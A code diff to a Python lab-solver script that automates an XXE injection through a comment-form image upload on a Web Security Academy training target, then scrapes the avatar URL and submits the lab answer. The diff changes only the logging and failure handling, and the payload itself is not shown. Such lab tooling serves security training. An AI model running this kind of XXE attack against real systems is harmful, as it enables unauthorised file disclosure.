@@ -1,4 +1,5 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.logger import logger
+from web_security_academy.core.utils import print_input
 from urllib.parse import urlencode, urljoin
 from bs4 import BeautifulSoup
 from html import unescape
@@ -38,31 +39,33 @@ def solve_lab(session):
     }
 
     path = "/post/comment"
-    print_info(
-        f'Injecting an XML external entity with the following POST request form data to "{path}":\n'
+    logger.info(
+        f'Injecting an XML external entity with the following POST request form data to "{path}":'
     )
-    print(f"data: {data}\n")
-    print(f"files: {files}\n")
+    logger.info(f"data: {data}")
+    logger.info(f"files: {files}")
 
     resp = session.post_path(path, data=data, files=files)
     if resp.status_code == 200:
-        print_success("XXE injection successful.\n")
+        logger.success("XXE injection successful.")
     else:
-        print_fail("XXE injection not successful.")
+        logger.failure("XXE injection not successful.")
+        return
 
     # Extract avatar image URL
     path = "/post"
     params = {"postId": 1}
-    print_info(f'Extracting avatar image URL from "{path}?{urlencode(params)}"')
+    logger.info(f'Extracting avatar image URL from "{path}?{urlencode(params)}"')
 
     resp = session.get_path(path, params=params)
     soup = BeautifulSoup(resp.text, "lxml")
     avatar_img = soup.select(".avatar")
     if len(avatar_img) == 0:
-        print_fail("Unable to extract avatar image URL.")
+        logger.failure("Unable to extract avatar image URL.")
+        return
     else:
         avatar_url = urljoin(session.url, avatar_img[-1].get("src"))
-        print_success(f"Avatar image URL: {avatar_url}\n")
+        logger.success(f"Avatar image URL: {avatar_url}")
 
     hostname = print_input("Enter the hostname from the provided URL here: ")
     session.submit_solution(hostname)
